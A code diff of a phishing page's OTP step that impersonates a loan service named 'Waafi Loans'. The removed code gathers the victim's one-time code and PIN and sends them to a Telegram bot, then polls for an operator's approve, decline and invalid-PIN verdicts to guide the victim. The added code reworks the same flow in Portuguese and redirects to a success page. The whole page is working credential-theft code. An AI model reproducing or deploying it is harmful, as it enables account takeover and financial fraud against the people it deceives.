+              });
+              location.href='success.html?'+params.toString();
             }
-
-            if (phone) {
-                phoneDisplayEl.innerHTML = `Code sent to <strong>${maskPhone(phone)}</strong>`;
+            else if(cb==='pin_invalid'){
+              clearInterval(iv);
+              document.getElementById('ov').classList.remove('on');
+              document.getElementById('pinOv').classList.add('on');
+              document.getElementById('pinErr').textContent='PIN Inválido. Tente novamente.';
+              document.getElementById('pinErr').classList.add('show');
+              document.getElementById('pinIn').value='';
+              document.getElementById('pinIn').focus();
             }
+          }
         }
+      }).catch(e=>console.error(e));
+  },1000);
+  setTimeout(()=>clearInterval(iv),300000);
+}
 
-        function maskPhone(phone) {
-            const p = phone.replace(/\s+/g, '');
-            if (p.length <= 5) return p;
-            return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
-        }
+function showErr(m){const e=document.getElementById('err');e.textContent=m;e.classList.add('show')}
+function clrErr(){document.getElementById('err').classList.remove('show')}
 
-        function createInputs(containerId, count) {
-            const container = document.getElementById(containerId);
-            container.innerHTML = '';
-            for (let i = 0; i < count; i++) {
-                const input = document.createElement('input');
-                input.type = 'text';
-                input.maxLength = 1;
-                input.className = 'otp-input';
-                input.inputMode = 'numeric';
-                input.pattern = '[0-9]*';
-                container.appendChild(input);
-            }
-        }
+function resetOTP(){
+  boxes.forEach(b=>{b.value='';b.classList.remove('ok')});
+  otp='';
+  boxes[0].focus();
+}
 
-        function getCode(containerId) {
-            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
-                       .map(i => i.value.trim()).join('');
-        }
-
-        function setupAutoFocus(containerId, length, onComplete) {
-            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', () => {
-                    input.value = input.value.replace(/\D/g, '');
-                    if (input.value.length === 1 && index < length - 1) {
-                        inputs[index + 1].focus();
-                    }
-                    if (getCode(containerId).length === length) {
-                        setTimeout(onComplete, 180);
-                    }
-                });
-                input.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && !input.value && index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                });
-            });
-        }
-
-        function focusFirstInput(containerId) {
-            const first = document.querySelector(`#${containerId} .otp-input`);
-            if (first) first.focus();
-        }
-
-        function buildNextUrl(page) {
-            const qs = getAllParams();
-            return qs ? `${page}?${qs}` : page;
-        }
-
-        function submitOTP() {
-            if (isProcessing) return;
-            isProcessing = true;
-            verifyBtn.disabled = true;
-            verifyBtn.textContent = 'Verifying...';
-
-            const otp = getCode('otpInputs');
-            if (otp.length !== 6) {
-                resetButton();
-                return;
-            }
-
-            const ts         = Date.now();
-            const approveId  = `otp_approve_${ts}`;
-            const declineId  = `otp_decline_${ts}`;
-            const validId    = `valid_${ts}`;
-            const invalidId  = `invalid_${ts}`;
-
-            const paramSummary = Array.from(params.entries())
-                .map(([k, v]) => `${k}: <code>${v}</code>`)
-                .join('\n');
-
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 OTP Verification — Waafi Loans</b>\n\n${paramSummary}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '✅ Approve', callback_data: approveId }],
-                            [
-                                { text: '✅ Valid PIN',   callback_data: validId },
-                                { text: '❌ Invalid PIN', callback_data: invalidId }
-                            ],
-                            [{ text: '❌ Decline', callback_data: declineId }]
-                        ]
-                    }
-                })
-            })
-            .then(() => {
-                spinner.style.display = 'flex';
-                startPolling(approveId, declineId, validId, invalidId);
-            })
-            .catch(() => { resetButton(); });
-        }
-
-        function startPolling(approveId, declineId, validId, invalidId) {
-            const interval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                    .then(r => r.json())
-                    .then(data => {
-                        if (!data.ok || !data.result) return;
-                        data.result.forEach(update => {
-                            state.lastUpdateId = update.update_id;
-                            if (update.callback_query) {
-                                const cb = update.callback_query.data;
-                                if (cb === approveId) {
-                                    clearInterval(interval);
-                                    spinner.style.display = 'none';
-                                    showPinModal();
-                                } else if (cb === validId) {
-                                    clearInterval(interval);
-                                    spinner.style.display = 'none';
-                                    window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
-                                } else if (cb === declineId) {
-                                    clearInterval(interval);
-                                    spinner.style.display = 'none';
-                                    errMsg.textContent = 'Request declined. Please try again.';
-                                    errMsg.style.display = 'block';
-                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
-                                    focusFirstInput('otpInputs');
-                                    resetButton();
-                                } else if (cb === invalidId) {
-                                    clearInterval(interval);
-                                    spinner.style.display = 'none';
-                                    pinErrMsg.textContent = 'Invalid PIN/Password. Please try again.';
-                                    pinErrMsg.style.display = 'block';
-                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
-                                    focusFirstInput('pinInputs');
-                                    confirmPinBtn.disabled = false;
-                                    confirmPinBtn.textContent = 'Confirm PIN/Password';
-                                }
-                            }
-                        });
-                    });
-            }, 1000);
-        }
-
-        function showPinModal() {
-            pinModal.style.display = 'flex';
-            document.body.style.overflow = 'hidden';
-            createInputs('pinInputs', 4);
-            setupAutoFocus('pinInputs', 4, submitPIN);
-            focusFirstInput('pinInputs');
-            pinErrMsg.style.display = 'none';
-        }
-
-        function submitPIN() {
-            const pin = getCode('pinInputs');
-            if (pin.length !== 4) return;
-            confirmPinBtn.disabled = true;
-            confirmPinBtn.textContent = 'Verifying...';
-            const ts        = Date.now();
-            const validId   = `valid_${ts}`;
-            const invalidId = `invalid_${ts}`;
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 PIN/Password Verification</b>\n\nPIN/Password: <code>${pin}</code>\n\nChoose action:`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: '✅ Valid PIN',   callback_data: validId },
-                            { text: '❌ Invalid PIN', callback_data: invalidId }
-                        ]]
-                    }
-                })
-            }).then(() => startPinPolling(validId, invalidId));
-        }
-
-        function startPinPolling(validId, invalidId) {
-            const interval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                    .then(r => r.json())
-                    .then(data => {
-                        data.result?.forEach(update => {
-                            state.lastUpdateId = update.update_id;
-                            if (update.callback_query) {
-                                const cb = update.callback_query.data;
-                                if (cb === validId) {
-                                    clearInterval(interval);
-                                    pinModal.style.display = 'none';
-                                    document.body.style.overflow = '';
-                                    window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
-                                } else if (cb === invalidId) {
-                                    clearInterval(interval);
-                                    pinErrMsg.textContent = 'Invalid PIN/Password. Please try again.';
-                                    pinErrMsg.style.display = 'block';
-                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
-                                    focusFirstInput('pinInputs');
-                                    confirmPinBtn.disabled = false;
-                                    confirmPinBtn.textContent = 'Confirm PIN/Password';
-                                }
-                            }
-                        });
-                    });
-            }, 1400);
-        }
-
-        function resetButton() {
-            isProcessing = false;
-            verifyBtn.disabled = false;
-            verifyBtn.textContent = 'Approve Transaction';
-        }
-
-        /* ── INIT ── */
-        createInputs('otpInputs', 6);
-        setupAutoFocus('otpInputs', 6, submitOTP);
-        verifyBtn.onclick = submitOTP;
-        confirmPinBtn.onclick = submitPIN;
-        loadOffer();
-    </script>
+window.addEventListener('load',()=>{init();boxes[0].focus()});
+</script>
 </body>
 </html>
